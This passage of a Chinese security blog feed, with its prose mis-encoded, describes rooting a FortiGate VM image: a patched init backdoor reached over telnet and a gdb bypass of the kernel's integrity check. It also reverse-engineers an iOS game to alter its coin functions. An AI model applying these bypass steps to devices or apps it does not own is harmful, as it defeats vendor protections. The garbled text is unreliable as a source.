src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcn9KGAaBQA5ul9xowbeeWnEe.png"></p><h2 id="è¿è¡Œåˆ°-shell"><a href="#è¿è¡Œåˆ°-shell" class="headerlink" title="è¿è¡Œåˆ° shell"></a>è¿è¡Œåˆ° shell</h2><p>ç™»å½•åˆ° cliï¼Œæ‰§è¡Œ <code>diag hardware smartctl</code></p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnzkFMwkKiJ46wEidtckK0Yc.png"></p><p>æŸ¥çœ‹ç»“æœ</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnd0fwycUWKwy9OLeWct0ozb.png"></p><p>å°è¯•ç”¨ telnet è¿æ¥åé—¨ï¼Œæ³¨æ„ç«¯å£æ˜¯ 22ï¼ï¼ï¼ï¼éœ€è¦æŒ‡å®šä¸€ä¸‹ç«¯å£</p><pre><code>telnet 192.168.109.111 22</code></pre><p>è¿™é‡Œçš„ ip æ˜¯åœ¨ cli ä¸­é…ç½®åçš„ï¼Œå¯ä»¥å‚è€ƒåŸºç¡€é…ç½®æ–‡ç« </p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnurjgBpjiLl8gmglgbyGXoh.png"></p><p>æ³¨æ„ï¼šè·å– shell åè¿˜éœ€è¦å€ŸåŠ© busybox æ¥æ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼Œå¦‚å›¾ï¼Œç›´æ¥æ‰§è¡Œä¼šæ‰¾ä¸åˆ°è½¯é“¾</p><h2 id="é‡åˆ°é—®é¢˜"><a href="#é‡åˆ°é—®é¢˜" class="headerlink" title="é‡åˆ°é—®é¢˜"></a>é‡åˆ°é—®é¢˜</h2><h3 id="EDDï¼šError-0400-reading-sector"><a href="#EDDï¼šError-0400-reading-sector" class="headerlink" title="EDDï¼šError 0400 reading sector"></a>EDDï¼šError 0400 reading sector</h3><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnHOHJZiPH1zqyAitv9rD4Oc.png"></p><h4 id="é€ æˆåŸå› "><a href="#é€ æˆåŸå› " class="headerlink" title="é€ æˆåŸå› "></a>é€ æˆåŸå› </h4><p>ä½¿ç”¨ windows ä¸‹çš„ diskgenius æ›¿æ¢ rootfs å¯¼è‡´</p><h4 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h4><p>ä½¿ç”¨å¦ä¸€å° linux è™šæ‹Ÿæœº æŒ‚è½½è™šæ‹Ÿç£ç›˜ï¼Œå¹¶å¤åˆ¶è¿›å»</p><h3 id="å¶å°”å‡ºç°-cpio-æ‰“åŒ…-blocks-æ‰“åŒ…å‰åä¸ç›¸åŒçš„é—®é¢˜"><a href="#å¶å°”å‡ºç°-cpio-æ‰“åŒ…-blocks-æ‰“åŒ…å‰åä¸ç›¸åŒçš„é—®é¢˜" class="headerlink" title="å¶å°”å‡ºç° cpio æ‰“åŒ… blocks æ‰“åŒ…å‰åä¸ç›¸åŒçš„é—®é¢˜"></a>å¶å°”å‡ºç° cpio æ‰“åŒ… blocks æ‰“åŒ…å‰åä¸ç›¸åŒçš„é—®é¢˜</h3><h3 id="åŒä¸Š-è¯¥é—®é¢˜ä¼šå¯¼è‡´è™šæ‹Ÿæœºå¯åŠ¨å-æ— ä»»ä½•æç¤º-æ— é™é‡å¯"><a href="#åŒä¸Š-è¯¥é—®é¢˜ä¼šå¯¼è‡´è™šæ‹Ÿæœºå¯åŠ¨å-æ— ä»»ä½•æç¤º-æ— é™é‡å¯" class="headerlink" title="åŒä¸Š è¯¥é—®é¢˜ä¼šå¯¼è‡´è™šæ‹Ÿæœºå¯åŠ¨å æ— ä»»ä½•æç¤º æ— é™é‡å¯"></a>åŒä¸Š è¯¥é—®é¢˜ä¼šå¯¼è‡´è™šæ‹Ÿæœºå¯åŠ¨å æ— ä»»ä½•æç¤º æ— é™é‡å¯</h3><h4 id="é€ æˆåŸå› -1"><a href="#é€ æˆåŸå› -1" class="headerlink" title="é€ æˆåŸå› "></a>é€ æˆåŸå› </h4><p>åœ¨ vmlinuz ä¸­å­˜åœ¨ä¸€å¤„ fgtsum æ ¡éªŒ,å…·ä½“ä½ç½®åœ¨ <code>0xFFFFFFFF807AC117</code> ã€‚</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnPqwpD4h8M029MQkMiPh9Kc.png"></p><h4 id="è§£å†³æ–¹æ³•-1"><a href="#è§£å†³æ–¹æ³•-1" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h4><p>åœ¨ <code>0xFFFFFFFF807AC117</code> å¤„ä¸‹æ–­ï¼Œç”¨ gdb ä¿®æ”¹ eax å€¼ä¸º 0ï¼Œå³å¯ç»•è¿‡éªŒè¯</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;è§£åŒ…&quot;&gt;&lt;a href=&quot;#è§£åŒ…&quot; class=&quot;headerlink&quot; title=&quot;è§£åŒ…&quot;&gt;&lt;/a&gt;è§£åŒ…&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;gzip -d rootfs.gz
sudo cpio -idmv &amp;lt; ./rootfs
sudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
sudo chroot . /sbin/ftar -xf /bin.tar
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;Patch-init-æ–‡ä»¶&quot;&gt;&lt;a href=&quot;#Patch-init-æ–‡ä»¶&quot; class=&quot;headerlink&quot; title=&quot;Patch init æ–‡ä»¶&quot;&gt;&lt;/a&gt;Patch init æ–‡ä»¶&lt;/h2&gt;&lt;p&gt;æ–‡ä»¶æ‰€åœ¨ä½ç½® &lt;code&gt;/bin/init&lt;/code&gt; ,æ³¨æ„è¿™ä¸ªæ˜¯è§£åŒ…åæ‰èƒ½æ‹¿åˆ°çš„æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;patch ä½ç½®åœ¨ &lt;code&gt;0x04518E5&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="åŸºç¡€çŸ¥è¯†" scheme="http://ioo0s.art/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="FortiGate" scheme="http://ioo0s.art/tags/FortiGate/"/>
    
  </entry>
  
  <entry>
    <title>åˆ©ç”¨VMwareè·å–shell</title>
    <link href="http://ioo0s.art/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/"/>
    <id>http://ioo0s.art/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/</id>
    <published>2023-02-06T05:46:36.000Z</published>
    <updated>2023-02-07T02:20:12.153Z</updated>
    
    <content type="html"><![CDATA[<h2 id="è·å–-vmlinuz"><a href="#è·å–-vmlinuz" class="headerlink" title="è·å– vmlinuz"></a>è·å– vmlinuz</h2><h3 id="æ–¹å¼ä¸€"><a href="#æ–¹å¼ä¸€" class="headerlink" title="æ–¹å¼ä¸€"></a>æ–¹å¼ä¸€</h3><p>å¯¹äº vmdk æ²¡æœ‰åŠ å¯†çš„è™šæ‹Ÿè®¾å¤‡æ¥è¯´ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æŒ‚è½½ç£ç›˜çš„æ–¹å¼æå–å‡º vmlinuz æ–‡ä»¶ï¼Œä½†æ˜¯è¦æ³¨æ„ç£ç›˜ä¸­çš„å†…æ ¸æ–‡ä»¶å‘½åå¯èƒ½ä¸åŒï¼ï¼ï¼</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcn2cjTeNLk3cdxSy6yrkdxef.png"></p><span id="more"></span><p>ä½¿ç”¨ DiskGenius æŒ‚è½½è™šæ‹Ÿç£ç›˜ï¼Œé€šè¿‡å¯»æ‰¾ vmlinuz æ–‡ä»¶çš„ç‰¹å¾ä¿¡æ¯æ¥ç¡®å®šå…·ä½“æ–‡ä»¶</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcn2BG3thFFguLDkrSTwqWYec.png"></p><p>ä¸€èˆ¬æƒ…å†µ vmlinuz æ–‡ä»¶å¤´éƒ¨ ä¼šå«æœ‰ä¸Šå›¾ä¸­çš„å­—ç¬¦ä¸²ä¿¡æ¯ï¼Œæˆ–è€…é€šè¿‡å¤´æ ‡è¯†ç¬¦ä¹Ÿå¯ä»¥åˆ¤æ–­æ–‡ä»¶ï¼Œæ‰€ä»¥ flatkc å°±æ˜¯è¯¥ç¯å¢ƒä¸­çš„ vmlinuz æ–‡ä»¶ï¼Œå³é”®å¯¼å‡ºå³å¯ã€‚</p><p>ä½¿ç”¨å·¥å…· <a href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a> å¯ä»¥å°†å†…æ ¸æ–‡ä»¶è½¬æ¢ä¸º elf æ–‡ä»¶ï¼Œæ–¹ä¾¿æˆ‘ä»¬æ¥ä¸‹æ¥çš„é€†å‘åˆ†æã€‚</p><p><strong>æ³¨æ„ï¼šè¯·ä¸è¦ç”¨è¯¥æ–¹æ³•å¾—åˆ°çš„ rootfs.gz ç›´æ¥è§£å‹ä½¿ç”¨ï¼Œå¦åˆ™åæœŸæ‰“åŒ…æ—¶ä¼šå‡ºç°é—®é¢˜ï¼ï¼ï¼</strong></p><h3 id="æ–¹å¼äºŒ"><a href="#æ–¹å¼äºŒ" class="headerlink" title="æ–¹å¼äºŒ"></a>æ–¹å¼äºŒ</h3><p>å°†è™šæ‹Ÿç£ç›˜æŒ‚è½½åˆ°å…¶ä»–è™šæ‹Ÿæœºä¸­ï¼Œå¹¶å¯åŠ¨è™šæ‹Ÿæœº</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnqDzrAcy5Krj2XG5AtXfIYf.png"></p><p>æœç´¢å¹¶æ‰“å¼€ <code>disk</code> åº”ç”¨</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnrSJtNfKhxmlPUYySXku1fb.png"></p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnxDdp9wGX6NZjcGaHH1KPUd.png"></p><p>æ‰¾åˆ°æ–°æ·»åŠ çš„ç¡¬ç›˜åï¼Œç‚¹å‡»å¯åŠ¨æŒ‰é’®ï¼Œæ¥ç€ç¡¬ç›˜ä¼šè¢«æŒ‚è½½ï¼Œè¿›è€Œå¾—åˆ° rootfs å’Œ vmlinuz</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnOVM9ShpKe6aUI4bRyywlde.png"></p><h2 id="å¯»æ‰¾æ–­ç‚¹å‡½æ•°"><a href="#å¯»æ‰¾æ–­ç‚¹å‡½æ•°" class="headerlink" title="å¯»æ‰¾æ–­ç‚¹å‡½æ•°"></a>å¯»æ‰¾æ–­ç‚¹å‡½æ•°</h2><p>åŠ è½½ vmlinux_elf æ–‡ä»¶åˆ° ida ä¸­è¿›è¡Œåˆ†æã€‚</p><p>é€šå¸¸ vmlinuz åˆå§‹åŒ–æµç¨‹ä¸­æœ€åä¸€æ­¥ï¼Œå†…æ ¸ä¼šæ‰§è¡Œ init_post å‡½æ•°ã€‚å…¶ä¸­åœ¨è¯¥å‡½æ•°ä¸­æœ€ç»ˆä¼šæ‰§è¡Œ/sbin/initã€‚</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnbwMuK4CGzX6yDzpIb9PuEf.png"></p><p>è®°å½•è¯¥å‡½æ•°åœ°å€ <code>FFFFFFFF807AC0E9</code> ,ä¸ºäº†æ¥ä¸‹æ¥è°ƒè¯•åšå‡†å¤‡</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnCjVKc5j2byi1YAp9jxrcWh.png"></p><h2 id="é…ç½®-vm-è°ƒè¯•ä¿¡æ¯"><a href="#é…ç½®-vm-è°ƒè¯•ä¿¡æ¯" class="headerlink" title="é…ç½® vm è°ƒè¯•ä¿¡æ¯"></a>é…ç½® vm è°ƒè¯•ä¿¡æ¯</h2><pre><code>debugStub.listen.guest64 = &quot;TRUE&quot;debugStub.listen.guest64.remote = &quot;TRUE&quot;debugStub.port.guest64 = &quot;12345&quot;debugStub.listen.guest32 = &quot;TRUE&quot;debugStub.listen.guest32.remote = &quot;TRUE&quot;debugStub.port.guest32 = &quot;12346&quot;</code></pre><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcn54fRCjoOOehEJ0l7llpG6e.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;è·å–-vmlinuz&quot;&gt;&lt;a href=&quot;#è·å–-vmlinuz&quot; class=&quot;headerlink&quot; title=&quot;è·å– vmlinuz&quot;&gt;&lt;/a&gt;è·å– vmlinuz&lt;/h2&gt;&lt;h3 id=&quot;æ–¹å¼ä¸€&quot;&gt;&lt;a href=&quot;#æ–¹å¼ä¸€&quot; class=&quot;headerlink&quot; title=&quot;æ–¹å¼ä¸€&quot;&gt;&lt;/a&gt;æ–¹å¼ä¸€&lt;/h3&gt;&lt;p&gt;å¯¹äº vmdk æ²¡æœ‰åŠ å¯†çš„è™šæ‹Ÿè®¾å¤‡æ¥è¯´ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡æŒ‚è½½ç£ç›˜çš„æ–¹å¼æå–å‡º vmlinuz æ–‡ä»¶ï¼Œä½†æ˜¯è¦æ³¨æ„ç£ç›˜ä¸­çš„å†…æ ¸æ–‡ä»¶å‘½åå¯èƒ½ä¸åŒï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcn2cjTeNLk3cdxSy6yrkdxef.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="åŸºç¡€çŸ¥è¯†" scheme="http://ioo0s.art/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="FortiGate" scheme="http://ioo0s.art/tags/FortiGate/"/>
    
  </entry>
  
  <entry>
    <title>ç‹é“²é“²çš„è‡´å¯Œä¹‹è·¯-é€†å‘åˆ†æ</title>
    <link href="http://ioo0s.art/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://ioo0s.art/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2023-02-06T03:10:52.000Z</published>
    <updated>2023-02-06T06:11:08.190Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ¸¸æˆä»‹ç»"><a href="#æ¸¸æˆä»‹ç»" class="headerlink" title="æ¸¸æˆä»‹ç»"></a>æ¸¸æˆä»‹ç»</h2><p>ç‰ˆæœ¬ï¼š1.2.4<br>è®¾å¤‡ï¼šxsmax<br>æ¸¸æˆç¯å¢ƒï¼šUnity</p><span id="more"></span><h3 id="æ¸¸æˆç©æ³•"><a href="#æ¸¸æˆç©æ³•" class="headerlink" title="æ¸¸æˆç©æ³•"></a>æ¸¸æˆç©æ³•</h3><p>çœ‹ç€ä»–æŒ–ï¼Œä½†æ˜¯ä½ éœ€è¦é’±å»å‡çº§è®¾å¤‡ã€åœºå­ç­‰ç­‰ï¼Œæ€»ä¹‹æœ‰é’±ï¼è¿™ä¸ªæ¸¸æˆå°±æ˜¯ä½ çš„å¤©ä¸‹ï¼ï¼ï¼</p><p>æ¸¸æˆä¸éœ€è¦é¢å¤–å……é’±ï¼Œä½†æ˜¯ä¼šä¸€ç›´æœ‰å¹¿å‘Š</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnJ17FucdZKSiH6x0ChWdZQd.png"></p><h2 id="é€†å‘è¿‡ç¨‹"><a href="#é€†å‘è¿‡ç¨‹" class="headerlink" title="é€†å‘è¿‡ç¨‹"></a>é€†å‘è¿‡ç¨‹</h2><h3 id="ç ¸å£³"><a href="#ç ¸å£³" class="headerlink" title="ç ¸å£³"></a>ç ¸å£³</h3><p>è·å–æœªåŠ å¯†APP</p><h4 id="ç ¸å£³ç¯å¢ƒ"><a href="#ç ¸å£³ç¯å¢ƒ" class="headerlink" title="ç ¸å£³ç¯å¢ƒ"></a>ç ¸å£³ç¯å¢ƒ</h4><ol><li>å®ä½“æœº xsmax ç³»ç»Ÿç‰ˆæœ¬ 14.8 å·²ç»è¶Šç‹±</li><li>Mac os ç¯å¢ƒ éœ€è¦è£…<strong>usbmuxd</strong><strong>ï¼Œ</strong><em>Windows ä¸‹æ²¡æ‰¾åˆ°èƒ½è§£å†³è¯¥é—®é¢˜çš„æ–¹æ³•</em></li><li>å‡å®‰è£… frida åŒä¸€ç‰ˆæœ¬å°±è¡Œ</li><li>Frida-ios-dump</li></ol><h4 id="å¼€å§‹ç ¸å£³"><a href="#å¼€å§‹ç ¸å£³" class="headerlink" title="å¼€å§‹ç ¸å£³"></a>å¼€å§‹ç ¸å£³</h4><ol><li>ç¡®ä¿ frida èƒ½æ­£å¸¸è¿é€š</li></ol><p>ä½¿ç”¨ usb è¿æ¥æ‰‹æœºè®¾å¤‡ï¼Œä½¿ç”¨å‘½ä»¤ <code>frida-ps -U</code> è¯¥å‘½ä»¤ç”¨äºæŸ¥çœ‹ USB è¿æ¥è®¾å¤‡å½“å‰è¿è¡Œçš„è¿›ç¨‹ã€‚</p><p>å¾…è¡¥å……å›¾</p><ol><li>ä½¿ç”¨ iproxy å‘½ä»¤è½¬å‘ 22 ç«¯å£ï¼Œ<code>iproxy 2222 22</code></li></ol><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcn0RZDt8j3nK46J3dKip84Le.png"></p><ol><li>ä¿®æ”¹ Frida-ios-dump è„šæœ¬ä¸­çš„ root å¯†ç </li><li>è¾“å…¥å‘½ä»¤ <code>python dump.py -l</code> åˆ—å‡ºå½“å‰è®¾å¤‡ä¸­çš„åº”ç”¨ç¨‹åº</li></ol><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcncd3lDAxThVjkRnfRXbvT7e.png"></p><ol><li>è¾“å…¥å‘½ä»¤ <code>python dump.py com.mojike.digearth</code> ï¼Œå¼€å§‹ç ¸å£³</li></ol><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnBdRrzbav42e0hDHn1Stvx1.png"></p><h3 id="è§£åŒ…åˆ†æ"><a href="#è§£åŒ…åˆ†æ" class="headerlink" title="è§£åŒ…åˆ†æ"></a>è§£åŒ…åˆ†æ</h3><p>å¤åˆ¶ dump ä¸­çš„ ipa æ–‡ä»¶åˆ° Windows ä¸‹ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥åˆ†æã€‚</p><p>é¦–å…ˆé‡å‘½å.ipa ä¸º.zip å¹¶è§£å‹</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnag2Z25uOhh6sj96vHGjINe.png"></p><p>ç®€å•è¯´æ˜ä¸€ä¸‹é‡è¦çš„ç›®å½•ç»“æ„ï¼Œè¯¥æ¸¸æˆæ˜¯ Unity å¼€å‘ã€‚</p><h4 id="Data-ç›®å½•"><a href="#Data-ç›®å½•" class="headerlink" title="Data ç›®å½•"></a>Data ç›®å½•</h4><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnqU56Sk9q7lCmgiS47dD58f.png"></p><p><code>data.unity3d</code> æ–‡ä»¶æ˜¯æ¸¸æˆçš„èµ„æºæ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ <code>AssetStudio.net6</code>  æˆ–è€… <code>AssetRipper_win_x64</code> è¿›è¡ŒæŸ¥çœ‹æˆ–è€…åˆ†æ</p><p><code>RaW</code> æ–‡ä»¶å¤¹é‡Œé¢æ”¾ç€ä¸€äº›åˆ†äº«æ—¶çš„å›¾ç‰‡èµ„æº</p><p><code>Managed</code> æ–‡ä»¶å¤¹æ”¾ç€ ll2cpp ç”Ÿæˆåçš„æ–‡ä»¶ éå¸¸é‡è¦ï¼ï¼ï¼</p><p><code>mono</code> æ”¾ç€æ•°æ®åº“ç›¸å…³æ–‡ä»¶</p><h4 id="Frameworks-ç›®å½•"><a href="#Frameworks-ç›®å½•" class="headerlink" title="Frameworks ç›®å½•"></a>Frameworks ç›®å½•</h4><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnyfJ63JIN5VypLEzOF4uMwb.png"></p><p><code>UnityFramework.framework</code> é‡Œé¢æ”¾ç€æ¸¸æˆç¼–è¯‘åçš„ object-c ç¨‹åº å¾ˆé‡è¦</p><p><code>KSAdSDK.framework</code> å¹¿å‘Šæ¡†æ¶ï¼Œæ²¡æœ‰è¯¦ç»† ç ”ç©¶</p><p><code>TTNetworkManager.framework</code> ç½‘ç»œç›¸å…³ï¼Œæ²¡æœ‰è¯¦ç»†ç ”ç©¶</p><h3 id="ll2cpp-åç¼–è¯‘"><a href="#ll2cpp-åç¼–è¯‘" class="headerlink" title="ll2cpp åç¼–è¯‘"></a>ll2cpp åç¼–è¯‘</h3><p>åˆ©ç”¨ <code>Il2CppDumper-net6-v6.7.25 </code> è¿›è¡Œåç¼–è¯‘</p><p><strong>å¯æ‰§è¡Œæ–‡ä»¶ä½ç½®</strong></p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnPDeYAgcm7Zt8BWMEW6Mbtc.png"></p><p>ç¬¦å·è¡¨æ•°æ®ä½ç½® <code>global-metadata.dat</code></p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnSVoilDB8tTBfvFls9MAnvb.png"></p><p>åç¼–è¯‘åçš„æ•°æ®ä¿¡æ¯</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnEYnzNfzvqp6n1wPbWL1mYf.png"></p><p>å…¶ä¸­ stringliteral.json æ˜¯å­—ç¬¦ä¸²è¡¨ä¿¡æ¯ï¼ŒåŒ…å«ç€æ¸¸æˆå­—ç¬¦ä¸²å’Œå¯¹åº”åç§»åœ°å€ï¼Œil2cpp.h æ˜¯ object-c çš„ç»“æ„ä½“ä¿¡æ¯</p><p>dump.cs æ˜¯.net åç¼–è¯‘åçš„æºç ä¿¡æ¯ï¼ŒDummyDll ä¸­åŒ…å«çš„æ˜¯æå–å‡ºæ¥çš„æ‰€æœ‰æ¸¸æˆ DLL ä¿¡æ¯ä¸ dump.cs å†…å®¹ä¸€è‡´ã€‚</p><h3 id="é€†å‘åˆ†æä¸»ç¨‹åº"><a href="#é€†å‘åˆ†æä¸»ç¨‹åº" class="headerlink" title="é€†å‘åˆ†æä¸»ç¨‹åº"></a>é€†å‘åˆ†æä¸»ç¨‹åº</h3><p>é¦–å…ˆé€šè¿‡ ida æ‰“å¼€ç¨‹åº</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcniqSbnOWZcULEuB3k3HwGeg.png"></p><p>æ¥ç€åˆ©ç”¨è„šæœ¬å¯¼å…¥ä¹‹å‰å¾—åˆ°çš„ il2cpp.h æ–‡ä»¶ï¼Œå’Œå­—ç¬¦ä¸²æ–‡ä»¶ä¿¡æ¯</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnoXIzcO49IjqQ8GIovJC9qh.png"></p><p>è¿™å‡ ä¸ªéƒ½å¯ä»¥å¯¼å…¥ï¼Œç­‰å¾… 20-30 åˆ†é’Ÿï¼ˆå‡½æ•°é‡éå¸¸å¤§ï¼ï¼ï¼‰</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcndmfo2D6CT5zJ6psKdIOfMg.png"></p><p>æ¥ç€å°±èƒ½çœ‹åˆ° å­—ç¬¦ä¸²å·²ç»å¯ä»¥åˆ†æå‡ºæ¥äº†ï¼Œå‡½æ•°åç§°ä¹Ÿå·²ç»æ¢å¤ï¼Œæ¥ç€é€šè¿‡å­—ç¬¦ä¸²æ–‡ä»¶ï¼Œæœç´¢æˆ‘ä»¬çš„éœ€æ±‚ `<strong>é’±ï¼ï¼ï¼ï¼</strong></p><p>é€šè¿‡å…³é”®å­— <code>money</code> ã€<code>coin</code> æœç´¢åˆ°ä¸€ä¸ªå…³é”®ä¿¡æ¯</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnSEqS3Y2DVAz35ebdDAKWfh.png"></p><p>ida ä¸­è¾“å…¥ gï¼Œå¤åˆ¶åœ°å€è·³è½¬</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcntjU2nDRNbOY7PzxaZQTG7d.png"></p><p>å‘ç°æœ‰å‡ ä¸ªå‡½æ•°å¼•ç”¨äº†è¯¥å­—ç¬¦ä¸²ï¼Œget_GameCoinã€set_GameCoinï¼Œå› ä¸ºç›®çš„æ˜¯è¦æ”¹é’±ï¼Œæ‰€ä»¥ set å¯¹æˆ‘ä»¬æ›´é‡è¦</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcn2Kno7Ua0UpgaVKRcbDnwjc.png"></p><p>æ ¹æ® value è¿›è¡Œè®¾ç½®ï¼Œçœ‹çœ‹å“ªé‡Œç”¨äº† set</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnAyS6owBybEtXazcymb3QBh.png"></p><p>å‘ç°æœ‰ CostCoin å‡½æ•°å’Œ AddCoin å‡½æ•°éƒ½ç”¨åˆ°äº†è¯¥å‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œæœ‰ä¸¤ç§æ”¹æ³•ï¼Œä¸€ä¸ªæ˜¯ä¿®æ”¹ AddCoin æ—¶è®¾ç½®é’±çš„æ•°é‡ï¼Œä¸€ä¸ªæ˜¯ä¿®æ”¹èŠ±è´¹æ—¶ä¸æ‰£é’±ã€‚</p><p><img 